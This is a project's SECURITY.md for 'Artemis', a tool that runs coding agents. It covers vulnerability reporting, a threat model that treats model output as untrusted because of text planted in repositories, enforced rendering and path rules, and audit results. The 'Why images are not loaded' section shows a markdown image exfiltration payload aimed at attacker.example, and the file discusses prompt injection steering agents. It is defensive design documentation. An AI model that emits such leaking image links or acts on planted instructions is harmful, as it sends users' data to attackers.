# Security

## Reporting a vulnerability

Open a [security advisory][advisories] rather than a public issue. If you would
rather not use GitHub, an ordinary issue saying only "I have a security report"
with no detail is fine, and contact can move from there.

[advisories]: https://github.com/c-wenlong/artemis/security/advisories/new

## The threat model

Artemis runs coding agents on your machine and renders what they produce. Two
things follow from that, and most of the security work here is about them.

**Model output is untrusted input.** It arrives from a harness that relays
whatever the model wrote, and the model has just read a repository that may
itself contain text planted to be read. Anything the renderer does with that
string is done on behalf of whoever planted it.

**Agents are given real capability on purpose.** They edit files and run
commands, because that is the product. Artemis does not try to sandbox them; it
tries to make what they did legible and reversible.

## What is enforced

| Surface | Rule | Where |
|---|---|---|
| Rendered markdown | Embedded HTML renders as text; `rehype-raw` is deliberately absent | `Markdown.tsx` |
| Links in output | `javascript:` and `data:` URLs are stripped | react-markdown default |
| Images in output | Described, never fetched — see below | `Markdown.tsx` |
| Webview | CSP: `default-src 'self'`, no object, no framing, connect limited to Tauri IPC | `tauri.conf.json` |
| Subprocesses | Always an argv array; no shell string is ever built | `proc.rs`, `pty.rs`, `adapters.rs` |
| Model-supplied paths | Absolute paths and `..` refused before any filesystem access | `paths.rs` |
| Patches | Header paths rebuilt from a vetted relative path; `git apply --check` first | `git.rs` |
| Quiver's files | Read-only, always | `quiver.rs` |
| Network | The host makes no outbound requests. Artemis does not phone home | — |

Each has a test. The path and patch rules are exercised against real git
repositories, because they are the ones that can destroy work.

### Why images are not loaded

`![](https://attacker.example/p.png?leak=…)` in an answer would fetch the moment
the transcript painted — no click, no warning — and anything the model had just
read could ride out in that query string. An image reference is shown with its
alt text and URL, and nothing is requested. Reference-style syntax is covered
too; it is the form that slips past a naive fix.

## Known accepted findings

**`cargo audit`: 0 vulnerabilities** across 449 crates. 17 warnings, all
transitive through Tauri and all accepted: 16 unmaintained (`atk`, `gdk`, `gtk`
and friends — the GTK3 bindings Tauri uses for the Linux webview — plus the
`unic-*` family) and 1 unsound (`glib` `VariantStrIter`). None is reachable from
Artemis's own code; they resolve when Tauri moves to GTK4.

**`pnpm audit`: 9 advisories, all dev-only.** Every one is in the
`vitest → vite → postcss/esbuild/nanoid` chain. None ships in the app. The
"critical" one concerns the Vitest UI server, which this project does not run.

## What is not protected against

- **A malicious harness binary.** If the agent on your `PATH` is hostile,
  Artemis runs it. There is no sandbox.
- **Prompt injection changing what an agent does.** Artemis makes the result
  visible and reversible; it does not prevent it.
- **Anything after you click Run.** The agent's own permissions are the agent's
  to enforce.
